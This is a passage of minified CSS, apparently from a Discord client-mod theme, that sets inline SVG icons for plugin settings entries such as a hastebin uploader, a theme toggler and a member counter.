2zM6.393 5.429a.322.322 0 00.321-.322V4.036a.322.322 0 00-.321-.322H5.32A.322.322 0 005 4.036v1.071c0 .177.145.322.321.322h1.072zm8.571 0a.322.322 0 00.322-.322V4.036a.322.322 0 00-.322-.322H8.321A.322.322 0 008 4.036v1.071c0 .177.145.322.321.322h6.643z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M6.393 5.429a.322.322 0 00.321-.322V4.036a.322.322 0 00-.321-.322H5.32A.322.322 0 005 4.036v1.071c0 .177.145.322.321.322h1.072zm8.893-.322a.322.322 0 01-.322.322H8.321A.322.322 0 018 5.107V4.036c0-.177.145-.322.321-.322h6.643c.177 0 .322.145.322.322v1.071zm-13-.821C1.576 4.286 1 4.862 1 5.57V15c0 .71.576 1.286 1.286 1.286h11.143c.71 0 1.285-.576 1.285-1.286v-.429H2.524V4.286h-.238zM15.714 2H4.571c-.71 0-1.285.576-1.285 1.286V14h12.428c.71 0 1.286-.576 1.286-1.286V3.286C17 2.576 16.424 2 15.714 2z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M2.286 4.286C1.576 4.286 1 4.862 1 5.57V15c0 .71.576 1.286 1.286 1.286h11.143c.71 0 1.285-.576 1.285-1.286v-.429H2.524V4.286h-.238zM15.714 2H4.571c-.71 0-1.285.576-1.285 1.286V14h12.428c.71 0 1.286-.576 1.286-1.286V3.286C17 2.576 16.424 2 15.714 2zm-9 3.107a.322.322 0 01-.321.322H5.32A.322.322 0 015 5.107V4.036c0-.177.145-.322.321-.322h1.072c.177 0 .321.145.321.322v1.071zm8.25.322a.322.322 0 00.322-.322V4.036a.322.322 0 00-.322-.322H8.321A.322.322 0 008 4.036v1.071c0 .177.145.322.321.322h6.643z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=pc-hastebin]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M2.84 3.02c-.144.017-.21.12-.233.36-.01.111-.045.287-.078.39-.062.195-.14.633-.17.951-.01.1-.052.32-.093.488-.041.168-.095.49-.12.717-.025.227-.08.529-.12.672a5.417 5.417 0 00-.127.7 6.116 6.116 0 01-.112.671c-.096.364-.113.461-.114.679-.001.128-.03.293-.076.442-.073.232-.13.55-.2 1.138-.02.16-.06.36-.092.447a3.413 3.413 0 00-.104.55c-.049.41-.11.755-.185 1.047a3.012 3.012 0 00-.063.445 2.41 2.41 0 01-.06.41 5.06 5.06 0 00-.184.966 3.54 3.54 0 01-.122.64c-.05.154-.08.319-.085.46v.033c-.003.093-.005.155.023.196.057.083.234.083.767.084h.863l.092-.077c.05-.043.1-.1.109-.13.031-.099.108-.57.108-.667 0-.118.107-.669.17-.88.025-.083.055-.303.065-.488.013-.234.04-.39.087-.518.067-.18.087-.285.184-.99.026-.192.062-.376.08-.41.045-.083.116-.353.116-.44 0-.038.055-.156.122-.262.068-.106.123-.208.123-.226 0-.053.284-.341.413-.419.76-.456 1.895-.359 2.15.184a.836.836 0 00.081.14c.144.173.148.824.01 1.37-.033.126-.08.424-.106.662a4.208 4.208 0 01-.122.671c-.326 1.034-.13 1.948.487 2.273l.275.145c.074.038.23.05.8.058l.71.01.087-.088c.071-.07.096-.132.124-.315.02-.125.05-.29.068-.365.117-.503-.001-.705-.406-.697-.404.008-.5-.196-.35-.752.027-.1.065-.348.083-.55.022-.24.058-.433.107-.564.05-.134.094-.375.137-.747.097-.822.103-.98.047-1.195a1.565 1.565 0 01-.05-.305c0-.16-.076-.433-.146-.528a.576.576 0 01-.08-.17c-.055-.223-.756-.96-.914-.96-.016 0-.125-.05-.24-.11-.429-.221-1.38-.22-1.834.004a1.273 1.273 0 01-.262.106c-.108 0-.51.32-.83.66l-.174.184-.02-.104c-.022-.122-.003-.234.08-.462.033-.09.073-.3.088-.464a7.56 7.56 0 01.2-1.08c.023-.084.056-.314.072-.511.017-.197.046-.387.065-.423.039-.072.181-.871.182-1.02 0-.05.029-.214.063-.365.105-.456.145-.69.166-.946.01-.134.04-.31.066-.39.058-.183.01-.277-.165-.326-.108-.03-1.213-.037-1.434-.01zm9.117.008c-.204.048-.237.118-.29.616-.03.268-.073.51-.109.6-.036.094-.078.328-.106.605a5.27 5.27 0 01-.124.726 4.998 4.998 0 00-.12.656c-.024.21-.079.533-.122.717a7.713 7.713 0 00-.122.717c-.024.21-.065.45-.09.534-.056.186-.124.593-.171 1.021-.02.175-.062.388-.095.473a2.35 2.35 0 00-.091.46c-.031.3-.09.632-.21 1.204a2.97 2.97 0 00-.062.458c-.001.092-.014.216-.03.275-.091.339-.12.47-.164.732-.027.16-.057.379-.067.488-.01.11-.052.329-.092.488-.04.16-.093.475-.12.702-.05.44-.077.58-.135.703-.113.24.05.31.688.298.654-.013.67-.034.728-.97.032-.527.047-.612.1-.57.118.093.228.223.267.316.083.198.484.64.71.783.063.04.133.095.156.122.023.028.053.05.067.05.014 0 .126.05.248.11.27.133.346.157.61.196.113.016.292.06.397.096.217.075.636.054.848-.043.058-.027.196-.058.305-.07.142-.014.278-.058.48-.154.156-.074.298-.135.315-.135.017 0 .063-.032.102-.07a.636.636 0 01.174-.114c.118-.049.843-.764.912-.9.025-.049.09-.158.145-.242.054-.083.114-.2.134-.26a.855.855 0 01.102-.199c.037-.05.092-.18.121-.29.03-.109.087-.285.127-.392.16-.426.172-1.897.02-2.232a3.242 3.242 0 01-.133-.396 1.412 1.412 0 00-.14-.357.408.408 0 01-.071-.127c0-.118-.668-.92-.765-.92a.37.37 0 01-.11-.072 2.34 2.34 0 00-.882-.402 3.212 3.212 0 01-.412-.095c-.234-.08-.625-.075-.882.01-.11.036-.274.075-.366.086a1.52 1.52 0 00-.387.124c-.12.058-.232.105-.25.105a.633.633 0 00-.162.1 3.744 3.744 0 01-.223.156c-.05.03-.174.143-.275.25-.262.276-.32.284-.32.046 0-.125.024-.247.075-.376a2.78 2.78 0 00.123-.572c.07-.543.128-.877.184-1.053.027-.084.057-.297.066-.473.01-.176.035-.355.057-.398.021-.043.06-.192.087-.33.027-.14.054-.263.061-.275.008-.012.035-.227.061-.478.03-.281.072-.52.11-.621.037-.096.075-.3.092-.488.015-.178.05-.43.079-.56.057-.267.044-.305-.133-.379-.108-.045-.742-.052-.92-.01zm2.596 6.283c.406.067 1.036.476 1.186.77.033.064.071.117.085.117.034 0 .067.077.222.52l.133.38v.503c0 .461-.007.524-.08.748-.044.134-.103.34-.131.458a1.218 1.218 0 01-.125.32c-.04.059-.093.155-.119.213-.05.12-.454.55-.643.689a1.59 1.59 0 00-.137.108c-.039.047-.616.27-.777.3-1.18.217-2.044-.272-2.48-1.404l-.145-.379v-.599c0-.4.012-.612.036-.64.019-.023.085-.192.146-.374.062-.182.152-.387.201-.454a.541.541 0 00.09-.16c0-.076.588-.687.662-.687a.277.277 0 00.088-.063c.29-.273 1.207-.46 1.788-.366z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M2.607 3.38c.023-.24.09-.343.232-.36.221-.028 1.326-.02 1.434.01.175.048.223.142.165.325-.026.08-.055.256-.066.39-.02.256-.061.49-.166.946a2.662 2.662 0 00-.063.366c0 .148-.143.947-.182 1.019-.019.036-.048.226-.065.423-.016.197-.05.427-.073.51a7.56 7.56 0 00-.199 1.08 2.398 2.398 0 01-.088.465c-.083.228-.102.34-.08.462l.02.104.173-.183c.322-.34.723-.66.831-.661.026 0 .144-.048.262-.106.454-.223 1.405-.225 1.834-.003.115.06.224.109.24.109.158 0 .86.737.914.96.013.051.049.127.08.17.07.095.146.369.146.528 0 .065.023.202.05.305.056.216.05.373-.047 1.195-.043.372-.088.613-.137.747-.049.13-.085.324-.107.565a4.285 4.285 0 01-.083.549c-.15.556-.054.76.35.752.405-.008.523.194.406.697-.018.075-.048.24-.068.365-.028.183-.053.244-.124.315l-.088.088-.709-.01c-.57-.008-.726-.02-.8-.059l-.275-.144c-.617-.325-.813-1.24-.487-2.273.044-.138.095-.42.122-.671.026-.238.073-.537.105-.663.14-.545.135-1.196-.009-1.369a.836.836 0 01-.082-.14c-.254-.543-1.39-.64-2.149-.184-.13.078-.413.366-.413.42 0 .017-.055.119-.123.225-.067.106-.122.224-.122.262 0 .087-.071.357-.115.44a2.392 2.392 0 00-.081.41c-.097.705-.117.81-.184.99a1.764 1.764 0 00-.087.518c-.01.185-.04.405-.065.489-.063.21-.17.761-.17.879 0 .096-.077.568-.108.668a.408.408 0 01-.109.13l-.092.077-.768-.001h-.095c-.533 0-.71 0-.767-.084-.028-.041-.026-.103-.024-.196l.001-.034c.004-.14.035-.305.085-.459a3.54 3.54 0 00.122-.64 5.06 5.06 0 01.184-.966c.023-.076.05-.26.06-.41.01-.15.038-.35.063-.445.075-.292.136-.638.185-1.048.026-.216.072-.463.104-.549.031-.086.072-.287.092-.447.07-.588.127-.906.2-1.138.047-.15.075-.314.076-.442.001-.218.018-.315.114-.679.034-.126.085-.428.112-.671.028-.243.085-.558.126-.7.041-.143.096-.445.12-.672.026-.226.08-.549.121-.717.04-.167.082-.387.092-.488.03-.318.11-.756.171-.95.033-.104.068-.28.078-.391zm9.06.264c.053-.498.086-.568.29-.616.178-.042.812-.035.92.01.177.074.19.112.133.38-.028.13-.064.38-.08.559a2.217 2.217 0 01-.09.488c-.039.101-.081.34-.11.621a5.863 5.863 0 01-.062.478 2.553 2.553 0 00-.06.274c-.027.14-.067.288-.088.33-.022.044-.047.223-.057.4-.009.175-.039.388-.066.472-.056.176-.115.51-.184 1.053a2.78 2.78 0 01-.123.572 1.01 1.01 0 00-.075.376c0 .238.058.23.32-.047.1-.106.224-.218.275-.25.05-.03.15-.1.223-.155a.633.633 0 01.163-.1c.016 0 .129-.047.249-.105a1.52 1.52 0 01.387-.124c.092-.011.257-.05.366-.086.258-.085.648-.09.882-.01.091.03.276.073.412.095.254.041.688.24.882.402a.37.37 0 00.11.072c.098 0 .765.802.765.92 0 .016.032.074.071.127.04.054.102.214.14.357.038.143.098.321.132.396.153.335.14 1.806-.02 2.232-.04.107-.096.283-.126.392-.03.11-.084.24-.12.29a.855.855 0 00-.103.2c-.02.059-.08.176-.134.26a3.47 3.47 0 00-.145.242c-.07.135-.794.85-.912.899a.636.636 0 00-.174.113c-.039.04-.085.071-.102.071-.017 0-.159.06-.314.135-.203.096-.34.14-.481.154-.11.012-.247.043-.305.07-.212.097-.63.118-.848.043a2.592 2.592 0 00-.397-.096c-.264-.039-.34-.063-.61-.196a1.86 1.86 0 00-.248-.11c-.014 0-.044-.022-.067-.05a.846.846 0 00-.156-.122c-.226-.142-.627-.585-.71-.783a.944.944 0 00-.268-.317c-.052-.04-.067.044-.1.57-.056.937-.073.958-.727.971-.638.013-.801-.058-.688-.298.058-.123.085-.264.136-.703.026-.227.08-.542.12-.702.04-.16.08-.379.09-.488.01-.11.041-.329.068-.488.043-.262.073-.393.164-.732.016-.06.029-.183.03-.275 0-.092.028-.298.062-.458.12-.572.178-.905.21-1.205a2.35 2.35 0 01.091-.46c.033-.084.075-.297.095-.472.047-.428.115-.835.17-1.02.026-.084.067-.325.09-.535.025-.21.08-.532.123-.717.043-.184.098-.507.121-.717.024-.21.078-.505.12-.656a5.27 5.27 0 00.125-.726c.028-.277.07-.511.106-.604.036-.091.08-.333.108-.6zm4.072 6.437c-.15-.294-.78-.703-1.186-.77-.58-.095-1.498.093-1.788.366a.277.277 0 01-.088.063c-.074 0-.662.611-.662.688 0 .02-.04.09-.09.159-.049.067-.14.272-.2.454-.062.182-.128.35-.147.374-.024.028-.035.24-.036.64v.599l.145.379c.436 1.132 1.3 1.621 2.48 1.403.161-.03.738-.252.777-.3.008-.01.07-.058.137-.107.189-.138.592-.57.643-.688.026-.06.08-.155.119-.214.04-.059.096-.203.125-.32.028-.118.087-.324.131-.458.073-.224.08-.287.08-.748v-.503l-.133-.38c-.155-.443-.188-.52-.222-.52-.014 0-.052-.053-.085-.117z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=powercord-jingle]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' viewBox='0 0 18 18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M7.69336 4.29456L5.35487 1.32812L3.82341 2.34123L6.1619 5.1812L7.69336 4.29456Z' fill='white'/%3E%3Cpath d='M7.51026 13.2442L5.9788 12.4651L3.82341 16.1627L5.35487 17.3281L7.51026 13.2442Z' fill='white'/%3E%3Cpath d='M0.5 5.96036L1.5 4.29456L4.84438 6.34391L3.95306 7.87537L0.5 5.96036Z' fill='white'/%3E%3Cpath d='M4.46355 10.9336L1.5 13.2442L0.5 11.8549L3.95306 9.5L4.46355 10.9336Z' fill='white'/%3E%3Cpath d='M8.75 11.5C4.66779 11.5 4.66545 6.01898 8.75 6.01898V11.5Z' fill='white'/%3E%3Cpath d='M10.25 1.32812V17.3281L14.25 11.8549H17.2755V5.96036H14.25L10.25 1.32812Z' fill='white'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M8.75 11.5C4.66779 11.5 4.66545 6.01898 8.75 6.01898V11.5ZM7.69336 4.29456L5.35487 1.32812L3.82341 2.34123L6.1619 5.1812L7.69336 4.29456ZM7.51026 13.2442L5.9788 12.4651L3.82341 16.1627L5.35487 17.3281L7.51026 13.2442ZM4.46355 10.9336L1.5 13.2442L0.5 11.8549L3.95306 9.5L4.46355 10.9336ZM0.5 5.96036L1.5 4.29456L4.84438 6.34391L3.95306 7.87537L0.5 5.96036ZM10.25 1.32812V17.3281L14.25 11.8549H17.2755V5.96036H14.25L10.25 1.32812Z' fill='white'/%3E%3C/svg%3E%0A")}.side-8zPYf6>.item-PXvHYJ[data-item-id=powercord-message-tooltips]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M15 1H3c-1.103 0-2 .897-2 2v8.999c0 1.103.897 2 2 2h3v2.625c0 .306.35.484.597.303L10.5 14H15c1.103 0 2-.897 2-2V3C17 1.898 16.103 1 15 1zM1 11.625c0-.045.008-.09.024-.132l3.245-8.25A.375.375 0 014.621 3h1.008a.375.375 0 01.352.243l3.246 8.25a.375.375 0 01-.352.507h-.4a.376.376 0 01-.352-.243l-.94-2.382H3.068l-.939 2.382a.375.375 0 01-.352.243h-.401A.375.375 0 011 11.625zm4.126-7.463L3.512 8.25H6.74L5.126 4.162zM15.25 5.25h.375a.375.375 0 01.375.375v6a.375.375 0 01-.375.375h-.375a.375.375 0 01-.375-.375v-.3A2.973 2.973 0 0113 12a3 3 0 01-3-3v-.75a3 3 0 013-3c.713 0 1.36.26 1.875.675v-.3a.375.375 0 01.375-.375zM14.875 9a1.875 1.875 0 01-3.75 0v-.75a1.875 1.875 0 013.75 0V9z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M5.843 3.066c.063.044.111.105.138.177l3.246 8.25a.375.375 0 01-.352.507h-.4a.376.376 0 01-.352-.243l-.94-2.382H3.068l-.939 2.382a.375.375 0 01-.352.243h-.401a.375.375 0 01-.352-.507l3.245-8.25A.375.375 0 014.621 3h1.008c.077 0 .151.023.214.066zM3.513 8.25l1.613-4.088L6.739 8.25H3.512zm12.112-3h-.375a.375.375 0 00-.375.375v.3A2.973 2.973 0 0013 5.25a3 3 0 00-3 3V9a3 3 0 003 3c.713 0 1.36-.26 1.875-.675v.3a.375.375 0 00.375.375h.375a.375.375 0 00.375-.375v-6a.375.375 0 00-.375-.375zm-1.3 5.076c.353-.352.55-.829.55-1.326v-.75a1.875 1.875 0 00-3.75 0V9a1.875 1.875 0 003.2 1.326zM15 1H3c-1.103 0-2 .897-2 2v8.999c0 1.103.897 2 2 2h3v2.625c0 .306.35.484.597.303L10.5 14H15c1.103 0 2-.897 2-2V3C17 1.898 16.103 1 15 1z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=quick-search]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M16.781 14.834l-3.115-3.115a.749.749 0 00-.532-.219h-.509A6.468 6.468 0 0014 7.5C14 3.91 11.09 1 7.5 1S1 3.91 1 7.5 3.91 14 7.5 14c1.51 0 2.897-.512 4-1.375v.51c0 .2.078.39.219.53l3.115 3.116a.747.747 0 001.06 0l.884-.884a.753.753 0 00.003-1.063zM7.5 11.5c-2.21 0-4-1.787-4-4 0-2.21 1.787-4 4-4 2.21 0 4 1.787 4 4 0 2.21-1.787 4-4 4z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M7.5 11.5c-2.21 0-4-1.787-4-4 0-2.21 1.787-4 4-4 2.21 0 4 1.787 4 4 0 2.21-1.787 4-4 4zm9.281 3.334l-3.115-3.115a.749.749 0 00-.532-.219h-.509A6.468 6.468 0 0014 7.5C14 3.91 11.09 1 7.5 1S1 3.91 1 7.5 3.91 14 7.5 14c1.51 0 2.897-.512 4-1.375v.51c0 .2.078.39.219.53l3.115 3.116a.747.747 0 001.06 0l.884-.884a.753.753 0 00.003-1.063z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=smart-typers]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M.5 12.81c.798 1.583 2.44 2.79 4.977 2.79 2.589 0 4.522-1.35 4.522-3.802 0-2.284-1.304-3.303-3.627-4.296l-.681-.292c-1.175-.512-1.68-.843-1.68-1.66 0-.663.505-1.169 1.303-1.169.786 0 1.292.331 1.759 1.168L9.2 4.187C8.306 2.603 7.06 2 5.321 2 2.888 2 1.324 3.557 1.324 5.608c0 2.225 1.304 3.283 3.277 4.12l.681.292c1.252.551 1.992.882 1.992 1.817 0 .785-.727 1.35-1.856 1.35-1.343 0-2.108-.708-2.692-1.662L.5 12.81zM17.5 3.383V2.32a.319.319 0 00-.315-.318C16.321 1.99 15.122 2 14.1 3.008c-1.002-.988-2.152-1.011-3.084-1.005a.319.319 0 00-.316.319v1.053c0 .177.145.32.323.319.69-.009 2.227.092 2.227 1.286v2.97h-.956a.319.319 0 00-.319.319V9.33c0 .176.143.319.319.319h.956v2.975c0 1.194-1.49 1.276-2.23 1.274a.319.319 0 00-.32.319v1.062c0 .174.14.316.315.318.864.011 2.063.002 3.085-1.006 1.002.988 2.152 1.011 3.084 1.005a.319.319 0 00.316-.319v-1.053a.319.319 0 00-.323-.319c-.69.009-2.227-.087-2.227-1.281V9.65h.956a.319.319 0 00.319-.319V8.27a.319.319 0 00-.319-.319h-.956V4.98c0-1.194 1.49-1.28 2.23-1.279.177 0 .32-.142.32-.318z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M5.477 15.6C2.94 15.6 1.298 14.393.5 12.81l2.226-1.285c.584.954 1.35 1.661 2.692 1.661 1.13 0 1.856-.564 1.856-1.35 0-.934-.74-1.265-1.992-1.816l-.681-.292c-1.973-.837-3.277-1.895-3.277-4.12C1.324 3.558 2.888 2 5.321 2c1.739 0 2.985.603 3.88 2.187L7.073 5.549c-.467-.837-.973-1.168-1.759-1.168-.798 0-1.304.506-1.304 1.168 0 .818.506 1.149 1.68 1.661l.682.292C8.695 8.495 10 9.514 10 11.798 10 14.25 8.066 15.6 5.477 15.6zM17.5 3.383V2.32a.319.319 0 00-.315-.318C16.321 1.99 15.122 2 14.1 3.008c-1.002-.988-2.152-1.011-3.084-1.005a.319.319 0 00-.316.319v1.053c0 .177.145.32.323.319.69-.009 2.227.092 2.227 1.286v2.97h-.956a.319.319 0 00-.319.319V9.33c0 .176.143.319.319.319h.956v2.975c0 1.194-1.49 1.276-2.23 1.274a.319.319 0 00-.32.319v1.062c0 .174.14.316.315.318.864.011 2.063.002 3.085-1.006 1.002.988 2.152 1.011 3.084 1.005a.319.319 0 00.316-.319v-1.053a.319.319 0 00-.323-.319c-.69.009-2.227-.087-2.227-1.281V9.65h.956a.319.319 0 00.319-.319V8.27a.319.319 0 00-.319-.319h-.956V4.98c0-1.194 1.49-1.28 2.23-1.279.177 0 .32-.142.32-.318z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=theme-toggler]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M13.683 1.472c-1.832 0-3.317 1.496-3.317 3.34v8.02c0 1.845 1.485 3.34 3.317 3.34S17 14.677 17 12.832v-8.02c0-1.844-1.485-3.34-3.317-3.34zm0 5.847a2.33 2.33 0 002.322-2.34 2.33 2.33 0 00-2.322-2.338A2.33 2.33 0 0011.36 4.98a2.33 2.33 0 002.322 2.339z' fill='%23fff'/%3E%3Cpath d='M2.755 11.96a2.197 2.197 0 00-1.053 2.915c.402.868-.15 1.683-.702 1.943.98.524 2.251.556 3.244.09a2.932 2.932 0 001.404-3.887 2.168 2.168 0 00-2.893-1.06zM8.9 1.519l-1.293-.474a.721.721 0 00-.927.436l-3.145 8.704 2.652.972 3.145-8.704a.73.73 0 00-.432-.934z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M17 12.831V4.813c0-1.845-1.485-3.341-3.317-3.341s-3.317 1.496-3.317 3.34v8.02c0 1.845 1.485 3.34 3.317 3.34S17 14.677 17 12.832zM1.702 14.875a2.197 2.197 0 011.053-2.914 2.168 2.168 0 012.893 1.06 2.932 2.932 0 01-1.404 3.886c-.993.467-2.265.435-3.244-.09.552-.259 1.104-1.074.702-1.942zm5.904-13.83l1.293.473a.73.73 0 01.432.934l-3.145 8.704-2.652-.972L6.679 1.48a.721.721 0 01.927-.436zm6.077 6.274a2.33 2.33 0 002.322-2.34 2.33 2.33 0 00-2.322-2.338A2.33 2.33 0 0011.36 4.98a2.33 2.33 0 002.322 2.339z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=total-members]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M6.265 7.096C6.265 5.94 5.325 5 4.169 5c-1.157 0-2.097.94-2.097 2.096 0 1.157.94 2.097 2.097 2.097 1.156 0 2.096-.94 2.096-2.097zM7.103 13.385c.407 0 .734-.281.734-.629v-.629c0-1.041-.986-1.886-2.201-1.886h-.164a3.38 3.38 0 01-2.607 0H2.7C1.486 10.24.5 11.086.5 12.127v.63c0 .347.328.628.734.628h5.87z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M17.363 8.16l.133-.749a.225.225 0 00-.22-.264h-1.4l.273-1.533a.225.225 0 00-.221-.264h-.76a.224.224 0 00-.222.185l-.288 1.612h-1.846l.274-1.533a.225.225 0 00-.221-.264h-.76a.224.224 0 00-.222.185l-.288 1.612h-1.48a.225.225 0 00-.221.185l-.134.749a.225.225 0 00.221.264h1.4l-.428 2.396h-1.48a.225.225 0 00-.221.185l-.134.748v.002c0 .139 0 .204.033.235.03.028.084.028.188.028h1.4l-.273 1.532a.225.225 0 00.221.264h.76a.225.225 0 00.222-.185l.287-1.611h1.847l-.274 1.532a.225.225 0 00.221.264h.76a.224.224 0 00.222-.185l.287-1.611h1.48a.225.225 0 00.222-.186l.134-.748a.225.225 0 00-.221-.264h-1.4l.427-2.396h1.48a.224.224 0 00.222-.185zm-5.193 2.58h1.847l.427-2.395h-1.846l-.428 2.396z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M6.265 7.096C6.265 5.94 5.325 5 4.169 5c-1.157 0-2.097.94-2.097 2.096 0 1.157.94 2.097 2.097 2.097 1.156 0 2.096-.94 2.096-2.097zm.838 6.29c.407 0 .734-.282.734-.63v-.629c0-1.041-.986-1.886-2.201-1.886h-.164a3.38 3.38 0 01-2.607 0H2.7C1.486 10.24.5 11.086.5 12.127v.63c0 .347.328.628.734.628h5.87zM17.496 7.41l-.133.749a.224.224 0 01-.221.185h-1.48l-.429 2.396h1.4c.14 0 .246.126.222.264l-.134.748a.225.225 0 01-.221.186h-1.48l-.288 1.611a.224.224 0 01-.221.185h-.761a.225.225 0 01-.221-.264l.274-1.532h-1.847l-.287 1.611a.225.225 0 01-.222.185h-.76a.225.225 0 01-.221-.264l.274-1.532h-1.4c-.105 0-.16 0-.189-.028-.033-.03-.033-.096-.033-.235v-.002l.134-.748a.225.225 0 01.221-.185h1.48l.428-2.396h-1.4a.225.225 0 01-.221-.264l.134-.749a.225.225 0 01.22-.185h1.481l.288-1.612a.224.224 0 01.221-.185h.76c.14 0 .246.126.222.264l-.274 1.533h1.846l.288-1.612a.224.224 0 01.221-.185h.76c.14 0 .246.126.222.264l-.274 1.533h1.4c.14 0 .246.126.221.264zm-5.326 3.33h1.847l.427-2.396h-1.846l-.428 2.396z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=user-details]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M15.667 3H2.333C1.597 3 1 3.597 1 4.333v9.778c0 .736.597 1.333 1.333 1.333h13.334c.736 0 1.333-.597 1.333-1.333V4.333C17 3.597 16.403 3 15.667 3zM5.889 5.667c.98 0 1.778.797 1.778 1.777a1.78 1.78 0 01-1.778 1.778A1.78 1.78 0 014.11 7.444c0-.98.797-1.777 1.778-1.777zM9 12.244c0 .295-.278.534-.622.534H3.4c-.344 0-.622-.24-.622-.534v-.533c0-.883.836-1.6 1.866-1.6h.14a2.876 2.876 0 002.21 0h.14c1.03 0 1.866.717 1.866 1.6v.533zm6.222-1.466c0 .122-.1.222-.222.222h-4a.223.223 0 01-.222-.222v-.445c0-.122.1-.222.222-.222h4c.122 0 .222.1.222.222v.445zm0-1.778c0 .122-.1.222-.222.222h-4A.223.223 0 0110.778 9v-.444c0-.123.1-.223.222-.223h4c.122 0 .222.1.222.223V9zm0-1.778c0 .122-.1.222-.222.222h-4a.223.223 0 01-.222-.222v-.444c0-.122.1-.222.222-.222h4c.122 0 .222.1.222.222v.444z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M2.333 3h13.334C16.403 3 17 3.597 17 4.333v9.778c0 .736-.597 1.333-1.333 1.333H2.333A1.334 1.334 0 011 14.111V4.333C1 3.597 1.597 3 2.333 3zM15 7.444c.122 0 .222-.1.222-.222v-.444c0-.122-.1-.222-.222-.222h-4c-.122 0-.222.1-.222.222v.444c0 .122.1.222.222.222h4zM15.222 9c0 .122-.1.222-.222.222h-4A.223.223 0 0110.778 9v-.444c0-.123.1-.223.222-.223h4c.122 0 .222.1.222.223V9zM15 11c.122 0 .222-.1.222-.222v-.445c0-.122-.1-.222-.222-.222h-4c-.122 0-.222.1-.222.222v.445c0 .122.1.222.222.222h4zM5.889 5.667c.98 0 1.778.797 1.778 1.777a1.78 1.78 0 01-1.778 1.778A1.78 1.78 0 014.11 7.444c0-.98.797-1.777 1.778-1.777zm2.489 7.11c.344 0 .622-.238.622-.533v-.533c0-.883-.836-1.6-1.867-1.6h-.139a2.866 2.866 0 01-2.21 0h-.14c-1.03 0-1.866.717-1.866 1.6v.533c0 .295.278.534.622.534h4.978z' fill='%23fff'/%3E%3C/svg%3E")}.side-8zPYf6>.item-PXvHYJ[data-item-id=better-quoter]:not(.role-3wi9Tf)::before{--icon: url("data:image/svg+xml,%3Csvg width='18' height='18' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M1 13.74h2.107c1.159 0 2.293-.024 2.517-.049 1.474-.18 2.399-.833 2.735-1.923.136-.434.146-1.3.024-1.763a3.028 3.028 0 00-.457-.98l-.117-.155.117-.16c.613-.814.73-2.173.272-3.137-.219-.468-.647-.877-1.173-1.13C6.203 4.05 5.77 4 3.083 4H1v9.74zm2.482-7.743l-.01 2.118.01 3.617 1.884-.013.238-.146c.438-.273.594-.784.365-1.227-.21-.414-.56-.55-1.397-.55H3.97V7.944h.623c.667-.005.87-.049 1.148-.258.448-.346.438-1.12-.02-1.447-.277-.2-.544-.243-1.415-.243h-.823z' fill='%23fff'/%3E%3Cpath d='M15.969 3.305a.889.889 0 00-.817-1.239h-1.598a.889.889 0 00-.798.498l-2.574 5.243c-.12.244-.182.512-.182.783v6.81c0 .49.398.889.889.889h5.222c.491 0 .889-.398.889-.89V9.956a.889.889 0 00-.889-.889h-1.937a.444.444 0 01-.409-.62l2.204-5.14z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M17 15.4V9.955a.889.889 0 00-.889-.889h-1.937a.444.444 0 01-.409-.62l2.204-5.14a.889.889 0 00-.817-1.24h-1.598a.889.889 0 00-.798.498l-2.574 5.243c-.12.244-.182.512-.182.783v6.81c0 .49.398.889.889.889h5.222c.491 0 .889-.398.889-.89z' fill='%23fff'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M15.969 3.305a.889.889 0 00-.817-1.239h-1.598a.889.889 0 00-.798.498l-2.574 